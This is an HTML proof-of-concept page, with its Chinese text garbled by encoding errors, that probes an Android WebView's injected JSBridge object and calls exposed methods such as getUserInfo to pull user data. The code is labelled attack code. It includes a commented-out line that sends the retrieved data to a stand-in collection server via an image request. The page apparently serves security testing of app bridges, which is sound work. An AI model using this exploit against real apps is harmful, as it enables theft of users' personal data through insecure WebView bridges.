<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>JSBridge Test Page</title>
    <style>
        body { font-family: sans-serif; padding: 20px; }
        button { font-size: 16px; padding: 10px; margin: 5px; cursor: pointer; }
        #status { margin-top: 20px; font-weight: bold; }
    </style>
    <!-- 1. å¼•å…¥ vConsoleï¼Œè¿™æ˜¯å…³é”®ï¼ -->
    <script src="https://unpkg.com/vconsole@latest/dist/vconsole.min.js"></script>
</head>
<body>
    <h1>JSBridge æ¼æ´æµ‹è¯•é¡µé¢</h1>
    <p>å¦‚æœé¡µé¢ä¸‹æ–¹å‡ºç°ç»¿è‰²çš„ vConsole æŒ‰é’®ï¼Œè¯´æ˜ç¯å¢ƒå·²å°±ç»ªã€‚</p>

    <button onclick="testDirectCall()">æµ‹è¯•ç›´æ¥è°ƒç”¨ (e.g., getUserInfo)</button>
    <button onclick="testUnifiedCall()">æµ‹è¯•ç»Ÿä¸€æ¥å£è°ƒç”¨ (e.g., call)</button>
    <button onclick="testPlutoGetUserInfo()">æµ‹è¯• Pluto.getUserInfo</button>

    <div id="status">ç­‰å¾…æ“ä½œ...</div>

    <script>
        // 2. åˆå§‹åŒ– vConsole
        var vConsole = new VConsole();

        // è·å–çŠ¶æ€æ˜¾ç¤ºåŒºåŸŸ
        const statusDiv = document.getElementById('status');

        // ä½¿ç”¨ vConsole.log æ¥è¾“å‡ºï¼Œè¿™æ ·èƒ½åœ¨æ‰‹æœºä¸Šçœ‹åˆ°
        function log(msg) {
            console.log(msg); // ä¹Ÿä¼šè¾“å‡ºåˆ°æµè§ˆå™¨æ§åˆ¶å°
            vConsole.log(msg); // è¾“å‡ºåˆ° vConsole
        }

        // 3. æ”»å‡»ä»£ç ï¼šå°è¯•ä¸åŒçš„è°ƒç”¨æ–¹å¼

        // æ–¹å¼ä¸€ï¼šå¦‚æœæ–¹æ³•ç›´æ¥æŒ‚åœ¨ Android å¯¹è±¡ä¸‹
        function testDirectCall() {
            log("--- å°è¯•ç›´æ¥è°ƒç”¨ ---");
            if (window.Android && window.Android.getUserInfo) {
                log("âœ… å‘ç° window.Android.getUserInfo");
                try {
                    const result = window.Android.getUserInfo();
                    log("ğŸ‰ è°ƒç”¨æˆåŠŸï¼è¿”å›ç»“æœ: " + JSON.stringify(result));
                    statusDiv.innerText = "ç›´æ¥è°ƒç”¨æˆåŠŸï¼è¯·æŸ¥çœ‹ vConsoleã€‚";
                    // å°†ç»“æœå‘é€åˆ°ä½ çš„æœåŠ¡å™¨
                    // new Image().src = 'https://your-server.com/collect?data=' + encodeURIComponent(JSON.stringify(result));
                } catch (e) {
                    log("âŒ è°ƒç”¨å¤±è´¥: " + e);
                    statusDiv.innerText = "ç›´æ¥è°ƒç”¨å¤±è´¥ã€‚";
                }
            } else {
                log("âŒ æœªå‘ç° window.Android.getUserInfo");
                statusDiv.innerText = "æœªå‘ç°ç›´æ¥è°ƒç”¨çš„æ–¹æ³•ã€‚";
            }
        }

        // æ–¹å¼äºŒï¼šå¦‚æœé€šè¿‡ç»Ÿä¸€çš„ call æ–¹æ³•è°ƒç”¨
        function testUnifiedCall() {
            log("--- å°è¯•ç»Ÿä¸€æ¥å£è°ƒç”¨ ---");
            if (window.Android && window.Android.call) {
                log("âœ… å‘ç° window.Android.call");
                try {
                    // å‡è®¾ call æ–¹æ³•çš„ç­¾åæ˜¯ call(pluginName, params, callback)
                    // æˆ‘ä»¬å°è¯•è°ƒç”¨ Pluto æ¨¡å—çš„ getUserInfo
                    window.Android.call('getUserInfo', {}, function(result) {
                        log("ğŸ‰ è°ƒç”¨æˆåŠŸï¼è¿”å›ç»“æœ: " + JSON.stringify(result));
                        statusDiv.innerText = "ç»Ÿä¸€æ¥å£è°ƒç”¨æˆåŠŸï¼è¯·æŸ¥çœ‹ vConsoleã€‚";
                    });
                } catch (e) {
                    log("âŒ è°ƒç”¨å¤±è´¥: " + e);
                    statusDiv.innerText = "ç»Ÿä¸€æ¥å£è°ƒç”¨å¤±è´¥ã€‚";
                }
            } else {
                log("âŒ æœªå‘ç° window.Android.call");
                statusDiv.innerText = "æœªå‘ç°ç»Ÿä¸€æ¥å£ã€‚";
            }
        }

        // æ–¹å¼ä¸‰ï¼šé’ˆå¯¹ Pluto æ¨¡å—çš„ç‰¹å®šè°ƒç”¨ï¼ˆåŸºäºä½ åˆ†æçš„æ’ä»¶åï¼‰
        function testPlutoGetUserInfo() {
             log("--- å°è¯•è°ƒç”¨ Pluto.getUserInfo ---");
            // è¿™ç§å¯èƒ½æ€§è¾ƒå°ï¼Œä½†å¯ä»¥å°è¯•
            if (window.Android && window.Android.Pluto && window.Android.Pluto.getUserInfo) {
                 log("âœ… å‘ç° window.Android.Pluto.getUserInfo");
                 // ... æ‰§è¡Œè°ƒç”¨
            } else {
                 log("âŒ æœªå‘ç° window.Android.Pluto.getUserInfo");
            }
        }

        // é¡µé¢åŠ è½½æ—¶ï¼Œå…ˆæ‰“å°ä¸€ä¸‹ window.Android å¯¹è±¡ï¼Œçœ‹çœ‹é‡Œé¢æœ‰ä»€ä¹ˆ
        window.onload = function() {
            log("é¡µé¢åŠ è½½å®Œæˆï¼Œå¼€å§‹æ£€æŸ¥ JSBridge å¯¹è±¡...");
            if (window.Android) {
                log("âœ… å‘ç° window.Android å¯¹è±¡ï¼");
                log("å†…å®¹: " + JSON.stringify(window.Android, null, 2));
            } else {
                log("âŒ æœªå‘ç° window.Android å¯¹è±¡ã€‚æ­¤ WebView å¯èƒ½æœªæ³¨å…¥ JSBridgeã€‚");
            }
        };
    </script>
</body>
</html>